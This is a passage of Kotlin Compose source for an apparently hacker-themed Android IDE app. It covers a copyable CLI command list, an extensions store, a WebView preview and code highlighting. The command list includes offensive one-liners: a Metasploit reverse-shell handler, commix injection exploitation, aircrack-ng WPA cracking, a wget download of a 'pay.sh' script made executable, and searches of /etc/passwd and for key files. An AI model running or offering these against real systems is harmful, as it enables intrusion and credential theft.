                            CliCommandItem("msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; run\"", "Hacking", "Launch msfconsole silently and auto-configure a basic multi/handler listener."),
                            CliCommandItem("commix --url=\"http://target/v.php?id=1\"", "Hacking", "Scan and exploit command injection vulnerabilities on a target web form."),
                            CliCommandItem("aircrack-ng -w wordlist.txt capture.cap", "Hacking", "Attempt to crack WPA/WPA2 wireless keys from capture PCAP logs."),

                            CliCommandItem("md5sum payload.bin", "Cryptography", "Generate the 128-bit MD5 hash checksum of a binary payload to verify file integrity."),
                            CliCommandItem("sha256sum source_code.zip", "Cryptography", "Generate a secure 256-bit SHA2 identifier of a source file."),
                            CliCommandItem("gpg --symmetric secret_notes.txt", "Cryptography", "Encrypt a text file symmetrically using a pass-phrase key."),
                            CliCommandItem("gpg --decrypt secret_notes.txt.gpg", "Cryptography", "Decrypt a symmetrically encrypted GPG archive by prompting for pass-phrase."),
                            CliCommandItem("openssl enc -aes-256-cbc -salt -in file.txt -out file.enc", "Cryptography", "Encrypt a file using military-grade AES-256 cipher with standard salting key."),
                            CliCommandItem("openssl enc -aes-256-cbc -d -in file.enc -out file.dec", "Cryptography", "Decrypt an AES-256 CBC encrypted file using OpenSSL command."),
                            CliCommandItem("echo -n \"password\" | base64", "Cryptography", "Encode a plaintext password string into a reversible Base64 format."),
                            CliCommandItem("echo \"cGFzc3dvcmQ=\" | base64 -d", "Cryptography", "Decode a Base64 string back into plaintext."),
                            CliCommandItem("openssl genrsa -out private_key.pem 2048", "Cryptography", "Generate a standard 2048-bit RSA private key file."),
                            CliCommandItem("openssl rsa -in private_key.pem -pubout -out public_key.pem", "Cryptography", "Extract the corresponding public key from an RSA private key archive."),
                            CliCommandItem("openssl req -new -key private_key.pem -out csr.pem", "Cryptography", "Create a Certificate Signing Request (CSR) to send to a Certificate Authority."),
                            CliCommandItem("openssl x509 -req -days 365 -in csr.pem -signkey private_key.pem -out cert.pem", "Cryptography", "Generate a self-signed SSL/TLS digital certificate valid for 365 days."),
                            CliCommandItem("gpg --gen-key", "Cryptography", "Initialize a brand new asymmetric GPG keypair with custom identity fields."),
                            CliCommandItem("gpg --import public_key.asc", "Cryptography", "Import a public key to enable secure encrypted message transmission."),
                            CliCommandItem("shasum -a 512 server_image.iso", "Cryptography", "Compute a 512-bit SHA hash signature of an ISO operating system image."),

                            CliCommandItem("python3 -m http.server 8080", "Utilities", "Spin up a lightweight HTTP server on port 8080 exposing the current directory."),
                            CliCommandItem("curl -I -L https://api.blackroot.org", "Utilities", "Inspect response headers while following any automatic HTTP redirects."),
                            CliCommandItem("wget -O script.sh https://blackroot.org/pay.sh", "Utilities", "Download an online shell script and save it as a custom local file."),
                            CliCommandItem("chmod +x script.sh", "Utilities", "Set executable permission bits on a shell script file."),
                            CliCommandItem("chown root:root key.pem", "Utilities", "Restrict access by updating a file's owner and group to 'root'."),
                            CliCommandItem("tar -czvf backup.tar.gz /var/www", "Utilities", "Create a compressed tarball archive of the entire web directory path."),
                            CliCommandItem("tar -xzvf backup.tar.gz", "Utilities", "Extract files from a compressed tarball archive into the active directory."),
                            CliCommandItem("unzip master.zip -d /opt", "Utilities", "Decompress a master zip archive and place outputs into the opt folder."),
                            CliCommandItem("grep -in \"password\" /etc/passwd", "Utilities", "Search for instances of 'password' inside passwd, showing line numbers and ignoring case."),
                            CliCommandItem("find /home -name \"*.key\" -type f", "Utilities", "Search the home directory recursively to locate files ending in '.key'."),
                            CliCommandItem("sed -i \"s/DEBUG=True/DEBUG=False/g\" settings.py", "Utilities", "Find and replace configuration flags inline inside Python settings file."),
                            CliCommandItem("awk '{print \$1, \$4}' access.log", "Utilities", "Parse a web server access log to extract and print only IP addresses and timestamps."),
                            CliCommandItem("tail -f /var/log/nginx/access.log", "Utilities", "Follow and print incoming web server request logs continuously in real-time."),
                            CliCommandItem("head -n 25 error.log", "Utilities", "Inspect the first 25 lines of a troubleshooting error log file."),
                            CliCommandItem("wc -l records.csv", "Utilities", "Compute the total number of lines (records) contained in a CSV database file.")
                        )
                    }

                    Column(
                        modifier = Modifier
                            .fillMaxSize()
                            .padding(16.dp)
                    ) {
                        // High-tech Store graphic banner
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(80.dp)
                                .clip(RoundedCornerShape(6.dp))
                                .border(1.dp, activeAccentColor, RoundedCornerShape(6.dp))
                        ) {
                            androidx.compose.foundation.Image(
                                painter = androidx.compose.ui.res.painterResource(id = R.drawable.img_store_banner_1783409470651),
                                contentDescription = "BlackRoot Store Banner",
                                modifier = Modifier.fillMaxSize(),
                                contentScale = androidx.compose.ui.layout.ContentScale.Crop
                            )
                            Box(
                                modifier = Modifier
                                    .fillMaxSize()
                                    .background(
                                        Brush.verticalGradient(
                                            colors = listOf(Color.Transparent, PitchBlack.copy(alpha = 0.7f))
                                        )
                                    )
                            )
                        }

                        Spacer(modifier = Modifier.height(10.dp))

                        // High-tech Sub-Tab Switcher
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(vertical = 4.dp),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Button(
                                onClick = { storeSubTab = "extensions" },
                                colors = ButtonDefaults.buttonColors(
                                    containerColor = if (storeSubTab == "extensions") activeAccentColor else CardGrey
                                ),
                                shape = RoundedCornerShape(6.dp),
                                border = BorderStroke(1.dp, if (storeSubTab == "extensions") activeAccentColor else DarkGrey),
                                modifier = Modifier.weight(1f).height(36.dp),
                                contentPadding = PaddingValues(0.dp)
                            ) {
                                Text(
                                    "EXTENSIONS",
                                    color = if (storeSubTab == "extensions") Color.Black else Color.White,
                                    fontSize = 11.sp,
                                    fontWeight = FontWeight.Bold,
                                    fontFamily = FontFamily.Monospace
                                )
                            }
                            Button(
                                onClick = { storeSubTab = "commands" },
                                colors = ButtonDefaults.buttonColors(
                                    containerColor = if (storeSubTab == "commands") activeAccentColor else CardGrey
                                ),
                                shape = RoundedCornerShape(6.dp),
                                border = BorderStroke(1.dp, if (storeSubTab == "commands") activeAccentColor else DarkGrey),
                                modifier = Modifier.weight(1f).height(36.dp),
                                contentPadding = PaddingValues(0.dp)
                            ) {
                                Text(
                                    "CLI COMMANDS (100)",
                                    color = if (storeSubTab == "commands") Color.Black else Color.White,
                                    fontSize = 11.sp,
                                    fontWeight = FontWeight.Bold,
                                    fontFamily = FontFamily.Monospace
                                )
                            }
                        }

                        Spacer(modifier = Modifier.height(10.dp))

                        if (storeSubTab == "extensions") {
                            Text(
                                text = "EXTENSIONS STORE",
                                color = activeAccentColor,
                                style = MaterialTheme.typography.titleMedium,
                                fontWeight = FontWeight.Bold,
                                fontFamily = FontFamily.Monospace,
                                modifier = Modifier.padding(bottom = 4.dp)
                            )
                            Text(
                                text = "Deploy custom virtual sub-engines, formats, and design icon-packs into the sandbox workspace.",
                                color = GhostGreen,
                                fontSize = 11.sp,
                                modifier = Modifier.padding(bottom = 16.dp)
                            )

                            LazyColumn(
                                verticalArrangement = Arrangement.spacedBy(12.dp)
                            ) {
                                val extensionsList = listOf(
                                    // --- CORE UTILITIES ---
                                    ExtensionItem("prettier", "Prettier Code Formatter", "Formats workspace files with custom auto-spacing and alignment.", "v3.0.3", "Linting Team", "Productivity"),
                                    ExtensionItem("autosave", "Auto-Save Engine Daemon", "Background daemon monitoring changes and auto-persisting to local storage.", "v1.0.1", "BlackRoot Core", "Productivity"),
                                    ExtensionItem("html_preview", "HTML5 Live Web Previewer", "Renders index.html, CSS and JS inside an interactive WebView sandbox.", "v1.2.0", "Web Dev Group", "Browsers"),
                                    ExtensionItem("js_console", "JavaScript JSEngine Console", "Run JS scripts with console outputs routed straight to your console.", "v2.5.1", "NodeJS Porting", "Languages"),
                                    ExtensionItem("icon_pack", "100+ Language Icon-Pack", "Configures gorgeous colorful custom file tag identifiers for 100+ file extensions.", "v4.0.0", "Design Guild", "Visuals"),
                                    ExtensionItem("python", "Python Execution Compiler", "VM compiler and execution sandboxing for .py scripts.", "v3.10.4", "BlackRoot Core", "Languages"),
                                    
                                    // --- BRAND NEW EXTRA EXTENSIONS (>25 in total!) ---
                                    // Category: Security & Analysis
                                    ExtensionItem("shodan_cli", "Shodan Target Query Tool", "Simulates Shodan database queries for target systems directly inside your CLI.", "v2.1.0", "Security Guild", "Security"),
                                    ExtensionItem("hash_decryptor", "MD5/SHA256 Decrypter", "Cracks base hashes by conducting dictionaries reference comparisons.", "v1.4.0", "Security Guild", "Security"),
                                    ExtensionItem("metasploit_mock", "Metasploit Exploit Mock Engine", "Provides auxiliary scanning modules for simulated sandbox pentests.", "v6.1.2", "RapidMock", "Security"),
                                    ExtensionItem("packet_analyzer", "Live Interface Packet Sniffer", "Analyzes live virtual loopback sockets to register socket operations.", "v1.0.0", "Core Network", "Security"),
                                    ExtensionItem("wireshark_lite", "Wireshark Lite Capture Parser", "Decompiles PCAP logs with readable frame descriptions in console.", "v0.9.8", "Sniffer Lab", "Security"),
                                    
                                    // Category: System Customization & Visuals
                                    ExtensionItem("theme_sunset", "Sunset Amber Glow Theme", "Overhauls entire active OS accents to a gorgeous orange-red neon gradient.", "v1.1.0", "Theme Crafters", "Visuals"),
                                    ExtensionItem("theme_ocean", "Deep Ocean Blue Theme", "Transform entire operating system aesthetic registers into an deep cyan ocean blue.", "v1.2.0", "Theme Crafters", "Visuals"),
                                    ExtensionItem("custom_banner", "Cyberpunk Console Matrix Banner", "Enriches store and dashboard with dynamic parallax matrix graphics.", "v1.5.0", "Design Guild", "Visuals"),
                                    ExtensionItem("ascii_art", "ASCII System Banner Designer", "Enables custom terminal welcome message graphics configuration.", "v2.0.0", "Design Guild", "Visuals"),
                                    ExtensionItem("font_mono", "JetBrains Mono Font Override", "Toggles system typography scale definitions into premium code layout rendering.", "v3.1.2", "Fonts Group", "Visuals"),
                                    
                                    // Category: Productivity & Tools
                                    ExtensionItem("regex_tester", "Interactive Regex Playground", "Verifies custom regular expression match patterns live in real-time.", "v1.0.2", "Productivity", "Productivity"),
                                    ExtensionItem("todo_manager", "CLI Terminal To-Do Tracker", "Maintains high priority action task arrays persistently inside the CLI.", "v2.2.0", "Productivity", "Productivity"),
                                    ExtensionItem("timer_pomodoro", "Pomodoro Focus Clock Daemon", "Fires focus timer events in active status bar logs to optimize working cycles.", "v1.0.5", "Productivity", "Productivity"),
                                    ExtensionItem("notes_widget", "Sticky Notes Desktop Panel", "Renders simple floating scratchpad elements inside the workspace environment.", "v1.1.0", "Productivity", "Productivity"),
                                    ExtensionItem("calendar_sync", "Local Sandbox Calendar Planner", "Keeps track of critical milestone timelines and project checklists.", "v1.3.4", "Productivity", "Productivity"),
                                    
                                    // Category: Languages & Interpreters
                                    ExtensionItem("c_compiler", "GCC Virtual Sandbox Compiler", "Pre-compiles pseudo C logic constructs into optimized assembler loops.", "v9.4.0", "Languages Team", "Languages"),
                                    ExtensionItem("bash_plus", "Extended Bash Shell Commands", "Enriches CLI parser with standard Linux features such as 'grep', 'diff', and 'tail'.", "v4.4.2", "Shell Devs", "Languages"),
                                    ExtensionItem("lua_interpreter", "Lua Core VM Environment", "Executes super lightweight Lua sandbox scripts straight inside your command processor.", "v5.4.4", "Lua Port", "Languages"),
                                    ExtensionItem("json_beautifier", "Interactive JSON Validator", "Parses and indents massive JSON data structures automatically on selection.", "v2.0.1", "Web Dev Group", "Languages"),
                                    ExtensionItem("markdown_live", "Markdown Sandbox View Compiler", "Transforms .md notes into rich typography documentation screens.", "v1.1.5", "Productivity", "Languages"),
                                    
                                    // Category: Network & Servers
                                    ExtensionItem("ftp_daemon", "Simulated FTP File Server", "Launches local file transfer daemon to allow simulation connections.", "v1.2.0", "Core Network", "Network"),
                                    ExtensionItem("dns_resolver", "Reverse DNS Dig Lookup Utility", "Queries DNS nameservers dynamically returning custom A and MX simulation headers.", "v1.4.2", "Core Network", "Network"),
                                    ExtensionItem("whois_lookup", "Whois Registry Query Tool", "Traces ownership info and registry registrar records for target domains.", "v1.1.0", "Core Network", "Network"),
                                    ExtensionItem("ping_monitor", "ICMP Latency Telemetry Panel", "Runs standard latency roundtrip checks plotting telemetry stats.", "v1.6.0", "Core Network", "Network"),
                                    ExtensionItem("http_header", "HTTP Response Header Inspector", "Retrieves complete transport server descriptors and SSL authentication metadata.", "v2.0.0", "Core Network", "Network")
                                )

                                items(extensionsList) { ext ->
                                    val isInstalled = installedExtensions.contains(ext.id)
                                    val isInstalling = installingExtensionId == ext.id

                                    Card(
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .border(1.dp, if (isInstalled) activeAccentColor else BorderGreen, RoundedCornerShape(8.dp)),
                                        colors = CardDefaults.cardColors(containerColor = CardGrey)
                                    ) {
                                        Column(
                                            modifier = Modifier.padding(14.dp)
                                        ) {
                                            Row(
                                                modifier = Modifier.fillMaxWidth(),
                                                horizontalArrangement = Arrangement.SpaceBetween,
                                                verticalAlignment = Alignment.CenterVertically
                                            ) {
                                                Row(verticalAlignment = Alignment.CenterVertically) {
                                                    val extIcon = when (ext.id) {
                                                        "prettier" -> Icons.Default.Build
                                                        "autosave" -> Icons.Default.Autorenew
                                                        "html_preview" -> Icons.Default.Language
                                                        "js_console" -> Icons.Default.Terminal
                                                        "icon_pack" -> Icons.Default.Star
                                                        "theme_sunset", "theme_ocean" -> Icons.Default.Palette
                                                        "shodan_cli", "hash_decryptor", "metasploit_mock", "wireshark_lite" -> Icons.Default.Security
                                                        "ping_monitor", "dns_resolver" -> Icons.Default.Router
                                                        "timer_pomodoro", "calendar_sync" -> Icons.Default.DateRange
                                                        "todo_manager", "notes_widget" -> Icons.Default.List
                                                        else -> Icons.Default.Code
                                                    }
                                                    Icon(
                                                        imageVector = extIcon,
                                                        contentDescription = ext.name,
                                                        tint = if (isInstalled) activeAccentColor else GhostGreen,
                                                        modifier = Modifier.size(24.dp)
                                                    )
                                                    Spacer(modifier = Modifier.width(10.dp))
                                                    Column {
                                                        Text(
                                                            text = ext.name,
                                                            color = if (isInstalled) activeAccentColor else Color.White,
                                                            fontWeight = FontWeight.Bold,
                                                            fontSize = 14.sp
                                                        )
                                                        Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                                                            Text(text = ext.category, color = BorderGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
                                                            Text(text = ext.version, color = GhostGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
                                                        }
                                                    }
                                                }

                                                if (isInstalled) {
                                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                                        Icon(Icons.Default.CheckCircle, contentDescription = "Installed", tint = activeAccentColor, modifier = Modifier.size(16.dp))
                                                        Spacer(modifier = Modifier.width(4.dp))
                                                        Text("INSTALLED", color = activeAccentColor, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                                                        
                                                        Spacer(modifier = Modifier.width(8.dp))
                                                        // Toggle Uninstall Button for major custom extensions
                                                        IconButton(
                                                            onClick = {
                                                                installedExtensions.remove(ext.id)
                                                                Toast.makeText(context, "Uninstalled '${ext.name}'!", Toast.LENGTH_SHORT).show()
                                                            },
                                                            modifier = Modifier.size(24.dp)
                                                        ) {
                                                            Icon(
                                                                imageVector = Icons.Default.Delete,
                                                                contentDescription = "Uninstall extension",
                                                                tint = BrightRed,
                                                                modifier = Modifier.size(16.dp)
                                                            )
                                                        }
                                                    }
                                                } else if (isInstalling) {
                                                    Text("INSTALLING $installProgress%", color = AmberYellow, fontSize = 11.sp, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
                                                } else {
                                                    Button(
                                                        onClick = {
                                                            scope.launch {
                                                                installingExtensionId = ext.id
                                                                installProgress = 0
                                                                while (installProgress < 100) {
                                                                    delay(40)
                                                                    installProgress += (15..28).random()
                                                                    if (installProgress > 100) installProgress = 100
                                                                }
                                                                installedExtensions.add(ext.id)
                                                                installingExtensionId = null
                                                                Toast.makeText(context, "Activated '${ext.name}'!", Toast.LENGTH_SHORT).show()
                                                            }
                                                        },
                                                        colors = ButtonDefaults.buttonColors(containerColor = DarkGrey),
                                                        border = BorderStroke(1.dp, activeAccentColor),
                                                        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp),
                                                        modifier = Modifier.testTag("install_${ext.id}")
                                                    ) {
                                                        Text("INSTALL", color = activeAccentColor, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                                                    }
                                                }
                                            }

                                            Spacer(modifier = Modifier.height(8.dp))
                                            Text(
                                                text = ext.description,
                                                color = TextGreen,
                                                fontSize = 11.sp
                                            )

                                            if (isInstalling) {
                                                Spacer(modifier = Modifier.height(8.dp))
                                                LinearProgressIndicator(
                                                    progress = { installProgress / 100f },
                                                    modifier = Modifier.fillMaxWidth().height(4.dp),
                                                    color = NeonGreen,
                                                    trackColor = DarkGrey
                                                )
                                            }
                                        }
                                    }
                                }
                            }
                        } else {
                            // COMMAND REFERENCE VIEW (100 CLI Commands)
                            Text(
                                text = "CLI COMMAND DATABASE",
                                color = activeAccentColor,
                                style = MaterialTheme.typography.titleMedium,
                                fontWeight = FontWeight.Bold,
                                fontFamily = FontFamily.Monospace,
                                modifier = Modifier.padding(bottom = 4.dp)
                            )
                            Text(
                                text = "Access 100 major pre-compiled hacker & system utility scripts. Tap COPY to buffer them immediately into your clipboard.",
                                color = GhostGreen,
                                fontSize = 11.sp,
                                modifier = Modifier.padding(bottom = 10.dp)
                            )

                            // Search Bar for Commands
                            OutlinedTextField(
                                value = commandSearchQuery,
                                onValueChange = { commandSearchQuery = it },
                                placeholder = { Text("Search 100 commands...", color = GhostGreen, fontSize = 12.sp) },
                                leadingIcon = { Icon(Icons.Default.Search, contentDescription = "Search", tint = activeAccentColor, modifier = Modifier.size(16.dp)) },
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .height(48.dp)
                                    .testTag("command_search_input"),
                                colors = OutlinedTextFieldDefaults.colors(
                                    focusedBorderColor = activeAccentColor,
                                    unfocusedBorderColor = DarkGrey,
                                    focusedContainerColor = CardGrey,
                                    unfocusedContainerColor = CardGrey,
                                    focusedTextColor = Color.White,
                                    unfocusedTextColor = Color.White
                                ),
                                textStyle = TextStyle(fontFamily = FontFamily.Monospace, fontSize = 12.sp),
                                singleLine = true,
                                shape = RoundedCornerShape(6.dp)
                            )

                            Spacer(modifier = Modifier.height(10.dp))

                            // Category chips selector
                            val categoriesList = listOf("All", "System", "Setup", "Network", "Hacking", "Cryptography", "Utilities")
                            Row(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(vertical = 4.dp),
                                horizontalArrangement = Arrangement.spacedBy(6.dp),
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                androidx.compose.foundation.lazy.LazyRow(
                                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                                ) {
                                    items(categoriesList) { cat ->
                                        val isSelected = selectedCommandCategory == cat
                                        Box(
                                            modifier = Modifier
                                                .clip(RoundedCornerShape(4.dp))
                                                .background(if (isSelected) activeAccentColor else CardGrey)
                                                .clickable { selectedCommandCategory = cat }
                                                .border(1.dp, if (isSelected) activeAccentColor else DarkGrey, RoundedCornerShape(4.dp))
                                                .padding(horizontal = 8.dp, vertical = 4.dp)
                                        ) {
                                            Text(
                                                text = cat.uppercase(),
                                                color = if (isSelected) Color.Black else GhostGreen,
                                                fontSize = 10.sp,
                                                fontWeight = FontWeight.Bold,
                                                fontFamily = FontFamily.Monospace
                                            )
                                        }
                                    }
                                }
                            }

                            Spacer(modifier = Modifier.height(10.dp))

                            // Filter the 100 commands dynamically
                            val filteredCommands = remember(commandSearchQuery, selectedCommandCategory) {
                                commandsList.filter { cmd ->
                                    val matchQuery = commandSearchQuery.isEmpty() ||
                                            cmd.command.contains(commandSearchQuery, ignoreCase = true) ||
                                            cmd.description.contains(commandSearchQuery, ignoreCase = true)
                                    val matchCategory = selectedCommandCategory == "All" || cmd.category == selectedCommandCategory
                                    matchQuery && matchCategory
                                }
                            }

                            // Render list
                            LazyColumn(
                                verticalArrangement = Arrangement.spacedBy(10.dp),
                                modifier = Modifier.weight(1f)
                            ) {
                                if (filteredCommands.isEmpty()) {
                                    item {
                                        Box(
                                            modifier = Modifier
                                                .fillMaxWidth()
                                                .padding(32.dp),
                                            contentAlignment = Alignment.Center
                                        ) {
                                            Text(
                                                "NO COMMANDS MATCHING SEARCH CRITERIA",
                                                color = BrightRed,
                                                fontFamily = FontFamily.Monospace,
                                                fontSize = 11.sp,
                                                fontWeight = FontWeight.Bold
                                            )
                                        }
                                    }
                                } else {
                                    items(filteredCommands) { cmd ->
                                        var isCopied by remember { mutableStateOf(false) }
                                        val clipboardScope = rememberCoroutineScope()

                                        Card(
                                            modifier = Modifier
                                                .fillMaxWidth()
                                                .border(
                                                    width = 1.dp,
                                                    color = if (isCopied) NeonGreen else activeAccentColor.copy(alpha = 0.35f),
                                                    shape = RoundedCornerShape(8.dp)
                                                ),
                                            colors = CardDefaults.cardColors(containerColor = CardGrey)
                                        ) {
                                            Column(modifier = Modifier.padding(12.dp)) {
                                                Row(
                                                    modifier = Modifier.fillMaxWidth(),
                                                    horizontalArrangement = Arrangement.SpaceBetween,
                                                    verticalAlignment = Alignment.CenterVertically
                                                ) {
                                                    // Category Badge
                                                    Box(
                                                        modifier = Modifier
                                                            .background(activeAccentColor.copy(alpha = 0.12f), RoundedCornerShape(4.dp))
                                                            .border(1.dp, activeAccentColor.copy(alpha = 0.3f), RoundedCornerShape(4.dp))
                                                            .padding(horizontal = 6.dp, vertical = 2.dp)
                                                    ) {
                                                        Text(
                                                            text = cmd.category.uppercase(),
                                                            color = activeAccentColor,
                                                            fontSize = 9.sp,
                                                            fontFamily = FontFamily.Monospace,
                                                            fontWeight = FontWeight.Bold
                                                        )
                                                    }

                                                    // Clipboard interactive action
                                                    Row(
                                                        verticalAlignment = Alignment.CenterVertically,
                                                        modifier = Modifier
                                                            .clip(RoundedCornerShape(4.dp))
                                                            .clickable {
                                                                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                                                                val clip = ClipData.newPlainText("BlackRoot Command", cmd.command)
                                                                clipboard.setPrimaryClip(clip)
                                                                isCopied = true
                                                                Toast.makeText(context, "Copied command!", Toast.LENGTH_SHORT).show()
                                                                clipboardScope.launch {
                                                                    delay(1500)
                                                                    isCopied = false
                                                                }
                                                            }
                                                            .border(1.dp, if (isCopied) NeonGreen else activeAccentColor, RoundedCornerShape(4.dp))
                                                            .padding(horizontal = 8.dp, vertical = 4.dp)
                                                            .testTag("copy_cmd_${cmd.command.hashCode()}")
                                                    ) {
                                                        Icon(
                                                            imageVector = if (isCopied) Icons.Default.Check else Icons.Default.ContentCopy,
                                                            contentDescription = "Copy command",
                                                            tint = if (isCopied) NeonGreen else activeAccentColor,
                                                            modifier = Modifier.size(12.dp)
                                                        )
                                                        Spacer(modifier = Modifier.width(4.dp))
                                                        Text(
                                                            text = if (isCopied) "COPIED" else "COPY",
                                                            color = if (isCopied) NeonGreen else activeAccentColor,
                                                            fontSize = 10.sp,
                                                            fontWeight = FontWeight.Bold,
                                                            fontFamily = FontFamily.Monospace
                                                        )
                                                    }
                                                }

                                                Spacer(modifier = Modifier.height(8.dp))

                                                // Executable command representation
                                                Box(
                                                    modifier = Modifier
                                                        .fillMaxWidth()
                                                        .background(PitchBlack, RoundedCornerShape(4.dp))
                                                        .border(1.dp, DarkGrey, RoundedCornerShape(4.dp))
                                                        .padding(10.dp)
                                                ) {
                                                    Text(
                                                        text = cmd.command,
                                                        color = TextGreen,
                                                        fontFamily = FontFamily.Monospace,
                                                        fontSize = 12.sp,
                                                        fontWeight = FontWeight.Bold
                                                    )
                                                }

                                                Spacer(modifier = Modifier.height(6.dp))

                                                // Context description
                                                Text(
                                                    text = cmd.description,
                                                    color = Color.White.copy(alpha = 0.85f),
                                                    fontSize = 11.sp,
                                                    style = MaterialTheme.typography.bodySmall
                                                )
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                is AppMode.WebPreview -> {
                    val htmlCode = if (selectedFileRelativePath.endsWith(".html") || selectedFileRelativePath.endsWith(".htm")) {
                        fileContentState.text
                    } else {
                        val firstHtml = filesList.firstOrNull { it.name.endsWith(".html") || it.name.endsWith(".htm") }
                        if (firstHtml != null) {
                            workspaceManager.readFile(firstHtml.relativePath)
                        } else {
                            """
                            <!DOCTYPE html>
                            <html>
                            <head>
                                <style>
                                    body { background-color: #0c0f0c; color: #39FF14; font-family: monospace; text-align: center; padding: 40px; }
                                    h1 { border-bottom: 2px solid #39FF14; padding-bottom: 10px; }
                                    .btn { background: #39FF14; color: black; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 20px; }
                                </style>
                            </head>
                            <body>
                                <h1>BlackRoot Sandboxed Browser</h1>
                                <p>No active HTML file selected. Create an index.html file in the IDE to render it live!</p>
                                <p>You can write tags, styling, JS scripts, and canvas elements.</p>
                            </body>
                            </html>
                            """.trimIndent()
                        }
                    }

                    Column(
                        modifier = Modifier
                            .fillMaxSize()
                            .padding(12.dp),
                        verticalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        // Top navigation bar inside browser
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .background(DarkGrey)
                                .border(1.dp, BorderGreen, RoundedCornerShape(4.dp))
                                .padding(8.dp),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(Icons.Default.Language, contentDescription = "Security Status", tint = NeonGreen, modifier = Modifier.size(16.dp))
                                Spacer(modifier = Modifier.width(6.dp))
                                Text(
                                    text = "file:///sandbox/${if (selectedFileRelativePath.endsWith(".html")) selectedFileRelativePath else "index.html"}",
                                    color = NeonGreen,
                                    fontSize = 11.sp,
                                    fontFamily = FontFamily.Monospace,
                                    maxLines = 1
                                )
                            }
                            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                Icon(
                                    imageVector = Icons.Default.Refresh,
                                    contentDescription = "Reload",
                                    tint = NeonGreen,
                                    modifier = Modifier
                                        .size(18.dp)
                                        .clickable {
                                            // Refresh webview by reloading same data
                                            Toast.makeText(context, "Webpage Reloaded", Toast.LENGTH_SHORT).show()
                                        }
                                )
                                Text(
                                    text = "[IDE]",
                                    color = AmberYellow,
                                    fontSize = 11.sp,
                                    fontWeight = FontWeight.Bold,
                                    fontFamily = FontFamily.Monospace,
                                    modifier = Modifier.clickable { currentMode = AppMode.IDE }
                                )
                            }
                        }

                        // Web Browser WebView Frame
                        Box(
                            modifier = Modifier
                                .weight(1f)
                                .fillMaxWidth()
                                .border(1.dp, BorderGreen, RoundedCornerShape(4.dp))
                                .background(Color.White)
                        ) {
                            AndroidView(
                                factory = { ctx ->
                                    WebView(ctx).apply {
                                        settings.javaScriptEnabled = true
                                        settings.domStorageEnabled = true
                                        webViewClient = WebViewClient()
                                        webChromeClient = object : WebChromeClient() {
                                            override fun onConsoleMessage(consoleMessage: ConsoleMessage?): Boolean {
                                                consoleMessage?.let {
                                                    webConsoleLogs.add("[Console] ${it.message()}")
                                                }
                                                return true
                                            }
                                        }
                                    }
                                },
                                update = { webView ->
                                    webView.loadDataWithBaseURL("https://sandbox.local/", htmlCode, "text/html", "UTF-8", null)
                                },
                                modifier = Modifier.fillMaxSize()
                            )
                        }

                        // Sandbox Console Viewer
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(120.dp)
                                .border(1.dp, BorderGreen, RoundedCornerShape(4.dp))
                                .background(PitchBlack)
                                .padding(8.dp)
                        ) {
                            Column(modifier = Modifier.fillMaxSize()) {
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween,
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Text("SANDBOX WEB CONSOLE LOGS", color = NeonGreen, fontSize = 10.sp, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
                                    Text(
                                        text = "CLEAR CONSOLE",
                                        color = BrightRed,
                                        fontSize = 9.sp,
                                        fontFamily = FontFamily.Monospace,
                                        modifier = Modifier.clickable { webConsoleLogs.clear() }
                                    )
                                }
                                HorizontalDivider(color = BorderGreen, modifier = Modifier.padding(vertical = 4.dp))
                                LazyColumn(modifier = Modifier.weight(1f)) {
                                    if (webConsoleLogs.isEmpty()) {
                                        item {
                                            Text("No web console logs captured yet.", color = GhostGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
                                        }
                                    } else {
                                        items(webConsoleLogs) { logMsg ->
                                            Text(logMsg, color = CyanBlue, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

// Regex-based Code Highlighting for Python, XML, and Plain Text
fun highlightCode(code: String, fileName: String): AnnotatedString {
    val extension = fileName.substringAfterLast(".").lowercase()
    return buildAnnotatedString {
        if (extension == "py" || extension == "js" || extension == "ts" || extension == "json") {
            // Keyword lists based on type
            val keywords = if (extension == "py") {
                setOf(
                    "def", "class", "import", "for", "in", "if", "else", "elif",
                    "print", "return", "while", "from", "and", "or", "not", "try", "except"
                )
            } else if (extension == "json") {
                setOf("true", "false", "null")
            } else {
                setOf(
                    "const", "let", "var", "function", "return", "if", "else", "for", "while",
                    "class", "import", "from", "export", "default", "true", "false", "null", "console", "log"
                )
            }
            
            val lines = code.split("\n")
            lines.forEachIndexed { lineIdx, line ->
                var pos = 0
                val length = line.length
                while (pos < length) {
                    val char = line[pos]
                    
                    // Comment line
                    if (char == '#' || (char == '/' && pos + 1 < length && line[pos + 1] == '/')) {
                        withStyle(style = SpanStyle(color = GhostGreen, fontWeight = FontWeight.Normal)) {
                            append(line.substring(pos))
                        }
                        break
